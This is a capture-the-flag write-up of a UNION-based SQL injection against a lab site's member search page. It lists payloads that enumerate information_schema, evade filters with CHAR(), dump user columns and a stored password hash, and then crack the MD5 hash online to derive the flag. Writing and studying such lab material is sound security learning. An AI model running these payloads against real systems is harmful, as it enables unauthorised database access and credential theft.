# SQL Injection - Database Enumeration

## Discovery Process

1. Identify a page with database queries (e.g., member search/lookup)
2. Notice URL parameters that might be vulnerable to SQL injection
3. Test for SQL injection vulnerability

## Vulnerability Details

- **Issue**: User input is not properly sanitized before being used in SQL queries
- **Attack vector**: SQL injection using UNION-based queries
- **Database**: MySQL/MariaDB with information_schema access

## Exploitation

### Step 1: List all tables in the database
```sql
1 UNION SELECT table_name, table_schema FROM information_schema.tables
```

Here we noticed a table named users with a surname `Member_Sql_Injection`

### Step 2: List columns from tables

Using CHAR() to bypass filters (ASCII codes for "users"):
```sql
1 UNION SELECT column_name, column_type FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115)
```

This reveals the columns: `one`, `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`

### Step 3: Extract data from the users table

Now that we know the table name and columns, extract the actual values (column `one` cannot be queried):
```sql
1 UNION SELECT user_id, first_name FROM users
1 UNION SELECT first_name, last_name FROM users
1 UNION SELECT town, country FROM users
1 UNION SELECT Commentaire, countersign FROM users
```

Found the flag hint in the query:
```sql
1 UNION SELECT Commentaire, countersign FROM users
```

**Response:**
```
ID: 1 UNION SELECT Commentaire, countersign FROM users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname: 5ff9d0165b4f92b14994e5c685cdce28
```

### Step 4: Decrypt and hash the password

1. **Decrypt the MD5 hash** using [CrackStation](https://crackstation.net/):
   - Input: `5ff9d0165b4f92b14994e5c685cdce28`
   - Output: `FortyTwo`

2. **Convert to lowercase**: `fortytwo`

3. **Generate SHA-256 hash** of `fortytwo` using [SHA256 Online Tool](https://emn178.github.io/online-tools/sha256.html):
   ```
   10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
   ```

4. Successfully obtained the flag

### Step 5: Validate flag

- Submit the SHA-256 hash as the flag
- Successfully obtained the flag
